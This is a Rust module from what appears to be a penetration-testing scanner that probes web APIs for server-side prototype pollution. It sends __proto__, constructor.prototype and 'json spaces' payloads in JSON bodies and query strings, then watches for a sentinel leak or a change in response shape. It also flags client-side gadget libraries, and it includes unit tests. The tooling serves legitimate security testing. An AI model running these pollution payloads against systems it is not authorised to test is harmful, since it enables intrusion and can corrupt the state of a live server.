//! Prototype Pollution Engine — differential server-side pollution detection + client gadget hints.
//! MITRE: T1059 (Command and Scripting Interpreter).

use crate::engine_dispatch::EngineRunContext;
use crate::engine_probes::{
    empty_ok, finding_with_probe_depth, http_client, http_get, normalize_url,
};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};
use std::time::Duration;

const PP_PROBE_DEPTH: &str = "prototype_pollution_surface";
const SENTINEL: &str = "wzPP9137polluted";

fn pp_finding(title: &str, severity: &str, description: &str, target: &str, extra: Value) -> Value {
    let mut f = finding_with_probe_depth(
        "prototype_pollution",
        title,
        severity,
        "T1059",
        description,
        target,
        PP_PROBE_DEPTH,
    );
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

async fn http_post_json(
    client: &reqwest::Client,
    url: &str,
    body: &Value,
) -> Option<crate::engine_probes::HttpProbe> {
    let resp = client
        .post(url)
        .header("Content-Type", "application/json")
        .json(body)
        .timeout(Duration::from_secs(8))
        .send()
        .await
        .ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or_default().to_string()))
        .collect();
    let body_text = resp.text().await.unwrap_or_default();
    let body_text = if body_text.len() > 65_536 {
        body_text[..65_536].to_string()
    } else {
        body_text
    };
    Some(crate::engine_probes::HttpProbe {
        status,
        headers,
        body: body_text,
        final_url,
    })
}

fn responses_differ(
    a: &crate::engine_probes::HttpProbe,
    b: &crate::engine_probes::HttpProbe,
) -> bool {
    if a.status != b.status {
        return true;
    }
    let len_delta = (a.body.len() as i64 - b.body.len() as i64).unsigned_abs();
    if len_delta > 32 {
        return true;
    }
    // Pretty-print / json-spaces gadget: pollution causes indented JSON.
    let a_indented = a.body.contains("\n  ") || a.body.contains("\n    ");
    let b_indented = b.body.contains("\n  ") || b.body.contains("\n    ");
    a_indented != b_indented
}

fn sentinel_leaked(body: &str, vector: &str) -> bool {
    if !body.contains(SENTINEL) {
        return false;
    }
    // When the vector is the sentinel token itself, any body hit is a confirmed leak.
    if vector == SENTINEL {
        return true;
    }
    !body.contains(vector)
}

const API_PATHS: &[&str] = &[
    "/api",
    "/api/v1",
    "/api/v2",
    "/graphql",
    "/data",
    "/submit",
    "/merge",
    "/api/merge",
    "/",
];

const CLIENT_GADGET_LIBS: &[(&str, &str)] = &[
    ("lodash", "lodash.merge / defaultsDeep gadget surface"),
    ("$.extend(true", "jQuery deep-extend gadget surface"),
    ("set-value", "set-value deep path gadget surface"),
    ("dot-prop", "dot-prop setter gadget surface"),
];

pub async fn run_prototype_pollution_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();

    let proto_payload = json!({"__proto__": {SENTINEL: true}});
    let constructor_payload = json!({"constructor": {"prototype": {SENTINEL: true}}});
    let spaces_payload = json!({"__proto__": {"json spaces": 10}});

    for path in API_PATHS {
        let url = format!("{}{}", base.trim_end_matches('/'), path);

        let baseline_body = json!({"probe": "wzPPbaseline"});
        let Some(baseline) = http_post_json(&client, &url, &baseline_body).await else {
            continue;
        };
        if baseline.status == 404 || baseline.status == 405 {
            continue;
        }

        for (label, payload) in [
            ("__proto__", &proto_payload),
            ("constructor.prototype", &constructor_payload),
            ("json-spaces", &spaces_payload),
        ] {
            let Some(polluted) = http_post_json(&client, &url, payload).await else {
                continue;
            };
            if sentinel_leaked(&polluted.body, SENTINEL) {
                findings.push(pp_finding(
                    &format!("Prototype pollution: {} sentinel leaked", label),
                    "critical",
                    &format!(
                        "POST {} with {} pollution leaked sentinel '{}' in the response without echoing the vector. Server-side prototype pollution is confirmed.",
                        polluted.final_url, label, SENTINEL
                    ),
                    target,
                    json!({ "path": path, "vector": label, "status": polluted.status }),
                ));
                break;
            }
            if responses_differ(&baseline, &polluted) && !polluted.body.contains("__proto__") {
                findings.push(pp_finding(
                    &format!("Prototype pollution differential: {}", label),
                    "high",
                    &format!(
                        "POST {} with {} changed response shape vs baseline (baseline HTTP {} / {} B → polluted HTTP {} / {} B) without echoing the payload key.",
                        url, label, baseline.status, baseline.body.len(), polluted.status, polluted.body.len()
                    ),
                    target,
                    json!({ "path": path, "vector": label }),
                ));
            }
        }

        // Follow-up GET after pollution attempt — sentinel in a fresh read proves global state.
        if let Some(follow) = http_get(&client, &url).await {
            if follow.body.contains(SENTINEL) {
                findings.push(pp_finding(
                    "Prototype pollution: sentinel in follow-up GET",
                    "critical",
                    &format!(
                        "After pollution POST, follow-up GET {} returned sentinel '{}' — polluted property persisted into a fresh object.",
                        follow.final_url, SENTINEL
                    ),
                    target,
                    json!({ "path": path }),
                ));
            }
        }
    }

    // Query-string vectors — only report on reflection without echoing the bracket syntax.
    let qp_urls = [
        (
            format!("{}/?__proto__[{}]=1", base.trim_end_matches('/'), SENTINEL),
            "__proto__-qs",
        ),
        (
            format!(
                "{}/?constructor[prototype][{}]=1",
                base.trim_end_matches('/'),
                SENTINEL
            ),
            "constructor-qs",
        ),
    ];
    for (url, vector) in &qp_urls {
        if let Some(p) = http_get(&client, url).await {
            if sentinel_leaked(&p.body, SENTINEL) {
                findings.push(pp_finding(
                    "Prototype pollution via query parameter",
                    "high",
                    &format!(
                        "Query-string {} vector leaked sentinel on {} without echoing the parameter name.",
                        vector, p.final_url
                    ),
                    target,
                    json!({ "vector": vector }),
                ));
            }
        }
    }

    // Client-side gadget hints from served JS (info only — requires manual chain).
    if let Some(page) = http_get(&client, &base).await {
        for (needle, desc) in CLIENT_GADGET_LIBS {
            if page.body.contains(needle) {
                findings.push(pp_finding(
                    &format!("Client-side PP gadget library: {}", needle),
                    "info",
                    &format!(
                        "Page at {} serves JS referencing '{}'. {}",
                        page.final_url, needle, desc
                    ),
                    target,
                    json!({ "library": needle }),
                ));
            }
        }
    }

    if findings.is_empty() {
        empty_ok("prototype_pollution", target)
    } else {
        let n = findings.len();
        EngineResult::ok(
            findings,
            format!("prototype_pollution: {} live finding(s)", n),
        )
    }
}

pub async fn run_prototype_pollution_result_ctx(
    target: &str,
    ctx: &EngineRunContext,
) -> EngineResult {
    let mut result = run_prototype_pollution_result(target).await;
    if ctx.memory_payloads.is_empty() || target.trim().is_empty() {
        return result;
    }
    let client = http_client().await;
    let base = normalize_url(target);
    for path in API_PATHS {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        for payload_str in &ctx.memory_payloads {
            let Ok(payload) = serde_json::from_str::<Value>(payload_str) else {
                continue;
            };
            if let Some(polluted) = http_post_json(&client, &url, &payload).await {
                if sentinel_leaked(&polluted.body, SENTINEL) {
                    result.findings.push(pp_finding(
                        "Prototype pollution via attacker-memory payload",
                        "critical",
                        &format!(
                            "Memory-replayed JSON body on {} leaked sentinel '{}'.",
                            polluted.final_url, SENTINEL
                        ),
                        target,
                        json!({ "path": path, "attacker_memory": true }),
                    ));
                    if let Some(id) = ctx.memory_path_ids.first() {
                        if let (Some(pool), Some(tid)) = (ctx.app_pool.as_ref(), ctx.tenant_id) {
                            crate::pentest_memory::record_replay_hit(pool.as_ref(), tid, *id).await;
                        }
                    }
                }
            }
        }
    }
    result
}

pub async fn run_prototype_pollution(target: &str) {
    print_result(run_prototype_pollution_result(target).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sentinel_leaked_detects_without_vector_echo() {
        assert!(sentinel_leaked(
            "value wzPP9137polluted ok",
            "wzPP9137polluted"
        ));
        assert!(!sentinel_leaked("__proto__ wzPP9137polluted", "__proto__"));
    }

    #[test]
    fn responses_differ_on_status() {
        let a = crate::engine_probes::HttpProbe {
            status: 200,
            headers: vec![],
            body: "ok".to_string(),
            final_url: "http://x".to_string(),
        };
        let b = crate::engine_probes::HttpProbe {
            status: 500,
            headers: vec![],
            body: "ok".to_string(),
            final_url: "http://x".to_string(),
        };
        assert!(responses_differ(&a, &b));
    }
}
